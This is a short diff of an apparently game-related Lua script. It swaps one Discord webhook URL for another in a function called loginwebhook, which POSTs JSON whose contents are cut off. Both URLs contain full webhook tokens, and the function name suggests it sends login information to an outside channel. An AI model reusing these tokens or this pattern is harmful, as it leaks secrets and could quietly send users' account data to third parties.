@@ -20,7 +20,7 @@ function log(str)
     LogToConsole("[`b[ DOM ]`0]"..str)
     end
 function loginwebhook()
-    MakeRequest("https://discord.com/api/webhooks/1355237111015538729/xuEEIiu0eehjXJOwl-wMduQ14LykN4lRXmbW_67WGKeX6Kq1tcZUX41n3Ebn_XnhXcx8",
+    MakeRequest("https://discord.com/api/webhooks/1375328470560931870/eCRBVbMVEjr_2blcBoDzLjlLQx7mkRp-pT5BGn6gG6TlbHJzkHn0NPnDmkS6llIc_BBh",
     "POST",
     {["Content-Type"] = "application/json"},
     [[{
